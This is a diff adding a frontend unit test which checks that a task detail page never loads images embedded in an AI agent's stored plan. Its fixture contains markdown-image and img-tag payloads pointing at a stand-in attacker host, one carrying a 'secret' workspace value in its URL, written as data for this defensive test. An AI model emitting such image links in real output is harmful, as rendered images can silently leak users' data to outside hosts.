@@ -299,6 +299,36 @@ describe('SquadTaskDetailPage', () => {
     expect(screen.queryByTestId('squad-task-approval')).toBeNull();
   });
 
+  it('never loads images embedded in a persisted agent plan', async () => {
+    const stub = stubFetch(
+      fakeResponse({ body: { data: ME } }),
+      fakeResponse({
+        body: {
+          data: treeFixture({
+            status: 'awaiting_plan_approval',
+            plan_markdown: [
+              '# Safe plan',
+              '- inspect',
+              '![audit](https://attacker.invalid/collect?workspace=secret)',
+              '<img src="https://attacker.invalid/raw">',
+            ].join('\n'),
+            children: [],
+            progress: { total: 0, done: 0, in_progress: 0, pending: 0, failed: 0 },
+          }),
+        },
+      }),
+    );
+    vi.stubGlobal('fetch', stub.fetchImpl);
+
+    renderPage();
+
+    const plan = await screen.findByTestId('squad-task-plan');
+    expect(plan.textContent).toContain('Safe plan');
+    expect(plan.textContent).toContain('inspect');
+    expect(plan.querySelector('img')).toBeNull();
+    expect(plan.innerHTML).not.toContain('attacker.invalid');
+  });
+
   it('rejects a pending plan via the reject endpoint', async () => {
     const stub = stubFetch(
       fakeResponse({ body: { data: ME } }),
